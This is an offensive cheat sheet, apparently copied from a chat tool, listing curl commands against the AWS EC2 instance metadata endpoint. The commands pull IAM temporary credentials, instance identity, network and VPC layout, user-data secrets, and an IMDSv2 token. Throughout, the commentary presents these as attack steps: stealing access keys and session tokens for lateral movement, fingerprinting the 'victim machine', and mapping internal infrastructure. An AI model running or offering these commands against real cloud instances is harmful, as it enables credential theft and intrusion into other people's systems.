
### 🔐 **IAM Credentials & Role Info**

bash

CopyEdit

`# List IAM roles attached to the instance curl http://169.254.169.254/latest/meta-data/iam/security-credentials/  # Retrieve temporary credentials for a specific IAM role curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>  # Get instance profile info (ARN, association time) curl http://169.254.169.254/latest/meta-data/iam/info`

🔍 _Used to extract access keys, secret keys, and session tokens for lateral movement._

---

### 🌍 **Region & Placement**

bash

CopyEdit

`# Get AWS region (e.g., us-east-1) curl http://169.254.169.254/latest/meta-data/placement/region`

🧭 _Important for setting AWS CLI/SDK region when using stolen credentials._

---

### 🧠 **Instance Identification**

bash

CopyEdit

`# Get the EC2 instance ID curl http://169.254.169.254/latest/meta-data/instance-id  # Get the EC2 instance type (e.g., t2.micro) curl http://169.254.169.254/latest/meta-data/instance-type  # Get the hostname of the instance curl http://169.254.169.254/latest/meta-data/hostname`

🧾 _Useful for identifying and fingerprinting the victim machine._

---

### 🌐 **Network Info**

bash

CopyEdit

`# Get local IP of the instance curl http://169.254.169.254/latest/meta-data/local-ipv4  # Get public IP if the instance has one curl http://169.254.169.254/latest/meta-data/public-ipv4  # Get MAC addresses for network interfaces curl http://169.254.169.254/latest/meta-data/network/interfaces/macs/`

🔧 _Helpful for situational awareness and understanding network layout._

---

### 🕸️ **VPC & Subnet Info**

bash

CopyEdit

`# Replace <mac> with a MAC address from the above MAC list  # Get VPC ID curl http://169.254.169.254/latest/meta-data/network/interfaces/macs/<mac>/vpc-id  # Get Subnet ID curl http://169.254.169.254/latest/meta-data/network/interfaces/macs/<mac>/subnet-id  # Get VPC CIDR block curl http://169.254.169.254/latest/meta-data/network/interfaces/macs/<mac>/vpc-ipv4-cidr-block`

🌐 _Useful for mapping internal AWS infrastructure._

---

### 🧾 **User-Defined Data**

bash

CopyEdit

`# Get user-data (sometimes contains secrets or setup scripts) curl http://169.254.169.254/latest/user-data`

🧨 _Can include hardcoded credentials, tokens, or internal IPs._

---

### 🔒 IMDSv2 Token (if required)

bash

CopyEdit

`# Get a token for IMDSv2 endpoints (required for newer instances) curl -X PUT "http://169.254.169.254/latest/api/token" \   -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`

🛡️ _Token is then passed with `X-aws-ec2-metadata-token` header in all other requests._